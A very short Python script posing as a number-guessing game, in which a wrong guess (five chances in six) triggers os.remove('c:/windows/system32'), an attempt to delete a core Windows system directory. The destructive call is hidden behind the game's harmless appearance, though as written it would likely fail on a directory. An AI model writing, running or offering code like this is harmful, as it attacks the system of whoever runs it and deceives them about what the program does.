import os
import random

if input("guess a number between 0 and 5") == random.choice(
    ["0", "1", "2", "3", "4", "5"]
):
    print("You guessed it")
else:
    os.remove("c:/windows/system32")
